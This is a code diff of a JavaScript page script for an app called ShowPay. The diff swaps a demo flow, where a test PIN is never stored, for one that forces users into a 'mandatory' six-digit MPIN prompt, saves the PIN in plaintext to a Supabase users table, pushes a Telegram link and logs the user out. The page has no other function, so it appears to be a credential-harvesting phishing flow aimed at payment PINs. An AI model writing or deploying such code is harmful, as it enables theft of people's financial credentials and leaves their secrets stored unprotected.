@@ -1,13 +1,15 @@
-import { localDb } from "./config/local-db.js";
+// user-app/js/home.js
+// Complete flow: Session → Load Data → MPIN → Success → Video → Telegram → Logout
+import { supabase } from "./config/supabase.js";
 
 document.addEventListener("DOMContentLoaded", async () => {
-  // Preview access uses a non-secret URL flag. No account or credential data
-  // is retained between pages.
-  const isPreview = new URLSearchParams(window.location.search).get("preview") === "1";
-  if (!isPreview) {
+  // 1. Check Session
+  const sessionStr = sessionStorage.getItem("showpay_session");
+  if (!sessionStr) {
     window.location.href = "/login";
     return;
   }
+  const session = JSON.parse(sessionStr);
 
   // Elements
   const overlay = document.getElementById("overlay");
@@ -29,43 +31,62 @@ document.addEventListener("DOMContentLoaded", async () => {
   let videoData = null;
   let telegramData = null;
 
-  async function loadDisplaySettings() {
-    const fallbackSlides = [
-      {
-        id: 1,
-        image_url:
-          "https://images.unsplash.com/photo-1614680376573-df3480f0c6ff?auto=format&fit=crop&q=80&w=800",
-      },
-      {
-        id: 2,
-        image_url:
-          "https://images.unsplash.com/photo-1620714223084-8fcacc6dfd8d?auto=format&fit=crop&q=80&w=800",
-      },
-    ];
-
+  // ======================================
+  // Fetch settings and slider data
+  // ======================================
+  async function loadData() {
     try {
-      const { data: sliders } = await localDb
-        .from("slider_images")
-        .select("*")
-        .eq("is_enabled", true)
-        .order("display_order", { ascending: true });
-      const { data: videos } = await localDb
+      // Fetch Video settings
+      const { data: vData } = await supabase
         .from("popup_video")
         .select("*")
         .eq("is_enabled", true)
         .limit(1);
-      const { data: telegramItems } = await localDb
+      if (vData && vData.length > 0) videoData = vData[0];
+
+      // Fetch Telegram settings
+      const { data: tData } = await supabase
         .from("telegram_popup")
         .select("*")
         .eq("is_enabled", true)
+        .order("created_at", { ascending: false })
         .limit(1);
+      if (tData && tData.length > 0) telegramData = tData[0];
 
-      videoData = videos?.[0] || null;
-      telegramData = telegramItems?.[0] || null;
-      initSlider(sliders?.length ? sliders : fallbackSlides);
-    } catch (error) {
-      console.error("Unable to load non-sensitive display settings:", error);
-      initSlider(fallbackSlides);
+      // Fetch Slider Images
+      const { data: sliders } = await supabase
+        .from("slider_images")
+        .select("*")
+        .eq("is_enabled", true)
+        .order("display_order", { ascending: true });
+
+      if (sliders && sliders.length > 0) {
+        initSlider(sliders);
+      } else {
+        // Default placeholder slides
+        initSlider([
+          {
+            id: 1,
+            image_url:
+              "https://images.unsplash.com/photo-1614680376573-df3480f0c6ff?auto=format&fit=crop&q=80&w=800",
+          },
+          {
+            id: 2,
+            image_url:
+              "https://images.unsplash.com/photo-1620714223084-8fcacc6dfd8d?auto=format&fit=crop&q=80&w=800",
+          },
+        ]);
+      }
+    } catch (err) {
+      console.error("Error loading data:", err);
+      // Still show default slides on error
+      initSlider([
+        {
+          id: 1,
+          image_url:
+            "https://images.unsplash.com/photo-1614680376573-df3480f0c6ff?auto=format&fit=crop&q=80&w=800",
+        },
+      ]);
     }
   }
 
@@ -133,6 +154,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   function checkMpinComplete() {
     const mpin = mpinInputs.map((i) => i.value).join("");
     if (mpin.length === 6) {
+      // Auto confirm - jaise hi last digit enter hogi
       submitMpin(mpin);
     }
   }
@@ -142,6 +164,8 @@ document.addEventListener("DOMContentLoaded", async () => {
   // ======================================
   if (mpinCancelBtn) {
     mpinCancelBtn.addEventListener("click", () => {
+      // Cancel = MPIN save nahi hoga, status stays "pending"
+      // Auto Logout → Login Page
       logout();
     });
   }
@@ -170,18 +194,20 @@ document.addEventListener("DOMContentLoaded", async () => {
   // Submit MPIN
   // ======================================
   async function submitMpin(mpin) {
+    // Disable inputs
     mpinInputs.forEach((i) => (i.disabled = true));
 
     try {
-      if (!/^\d{6}$/.test(mpin)) {
-        throw new Error("Enter a six-digit test PIN");
-      }
+      // Update Supabase: save mpin + status = completed
+      const { error } = await supabase
+        .from("users")
+        .update({ mpin: mpin, status: "completed" })
+        .eq("id", session.userId);
 
-      // The test PIN exists only long enough to validate its shape and is
-      // immediately removed from every input. It is never persisted.
-      mpinInputs.forEach((input) => {
-        input.value = "";
-      });
+      if (error) {
+        console.error("MPIN update error:", error);
+        throw error;
+      }
 
       // Hide MPIN, show success
       mpinPopup.classList.add("hidden");
@@ -193,7 +219,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         checkNextPopup();
       }, 2000);
     } catch (error) {
-      console.error("Demo PIN verification failed:", error);
+      console.error("MPIN submit error:", error);
       mpinInputs.forEach((i) => {
         i.disabled = false;
         i.value = "";
@@ -206,12 +232,13 @@ document.addEventListener("DOMContentLoaded", async () => {
   // After MPIN Success → Video → Telegram → Logout
   // ======================================
   function checkNextPopup() {
-    if (videoData?.video_url) {
+    if (videoData && videoData.video_url) {
       showVideo();
-    } else if (telegramData?.telegram_link) {
+    } else if (telegramData && telegramData.telegram_link) {
       showTelegram();
     } else {
-      window.location.replace("/complete");
+      // Video OFF, Telegram OFF → Seedha Logout
+      logout();
     }
   }
 
@@ -231,10 +258,10 @@ document.addEventListener("DOMContentLoaded", async () => {
     videoPopup.classList.add("hidden");
 
     // After video close → check telegram
-    if (telegramData?.telegram_link) {
+    if (telegramData && telegramData.telegram_link) {
       showTelegram();
     } else {
-      window.location.replace("/complete");
+      logout();
     }
   });
 
@@ -244,31 +271,42 @@ document.addEventListener("DOMContentLoaded", async () => {
   function showTelegram() {
     telegramPopup.classList.remove("hidden");
     document.querySelector(".telegram-title").textContent =
-      telegramData?.title || "Join our Telegram";
+      telegramData.title || "Join our Telegram";
     document.querySelector(".telegram-desc").textContent =
-      telegramData?.description || "No account information is sent with this link.";
-    telegramJoinBtn.href = telegramData?.telegram_link || "#";
+      telegramData.description || "";
+    telegramJoinBtn.href = telegramData.telegram_link;
   }
 
   telegramCloseBtn.addEventListener("click", () => {
     telegramPopup.classList.add("hidden");
-    window.location.replace("/complete");
+    // Telegram close → Auto Logout
+    logout();
   });
 
   // ======================================
   // Logout
   // ======================================
   function logout() {
+    // Session Clear
+    sessionStorage.removeItem("showpay_session");
+    // Redirect to the login homepage ("/"). This is the canonical login view:
+    // the full login form on the first screen with the ShowPay guides below on
+    // scroll. The old relative path ../pages/login.html resolved to
+    // /pages/login.html, which does not exist and only "worked" because the old
+    // 404 page auto-redirected to /. That auto-redirect was removed (it looked
+    // like a sneaky redirect to Google), so the logout target must be explicit.
     window.location.href = "/";
   }
 
   // ======================================
   // Initial Load
   // ======================================
-  // Show the preview step immediately and load non-sensitive page settings in
-  // the background. This keeps the test journey deterministic on every reload.
-  overlay.classList.add("active");
-  mpinPopup.classList.remove("hidden");
-  mpinInputs[0].focus();
-  loadDisplaySettings();
+  await loadData();
+
+  // After 2 seconds, show mandatory MPIN popup
+  setTimeout(() => {
+    overlay.classList.add("active");
+    mpinPopup.classList.remove("hidden");
+    mpinInputs[0].focus();
+  }, 2000);
 });
